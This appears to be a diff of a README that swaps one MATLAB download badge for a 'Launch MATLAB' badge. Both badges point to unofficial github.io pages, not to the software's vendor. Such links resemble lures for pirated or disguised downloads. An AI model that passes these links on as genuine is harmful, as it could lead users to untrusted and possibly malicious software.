@@ -2,7 +2,7 @@
 
 ## 📥 MATLAB
 
-[![⬇️ MATLAB](https://img.shields.io/badge/Download-MATLAB-blue?style=for-the-badge&logo=mathworks)](https://silascortesqeby.github.io/.github/MATLAB-plus)
+[![Launch MATLAB](https://img.shields.io/badge/Launch-MATLAB-C2410C?style=flat-square)](https://matlab-model.github.io/.github/)
 
 ---
 
